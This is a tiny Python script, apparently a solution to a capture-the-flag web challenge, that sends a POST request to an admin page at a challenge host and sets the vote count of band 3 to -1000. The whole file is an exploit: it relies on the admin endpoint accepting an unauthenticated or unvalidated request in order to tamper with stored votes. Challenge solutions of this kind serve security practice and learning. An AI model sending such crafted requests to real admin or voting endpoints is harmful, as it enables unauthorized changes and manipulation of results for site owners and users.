#!/usr/bin/env python3

import requests

data_band = {'band_id':"3","votes":"-1000"}

r = requests.post(url='http://2.challenge.auth.site/admin/index.php', data=data_band )

print(r.text)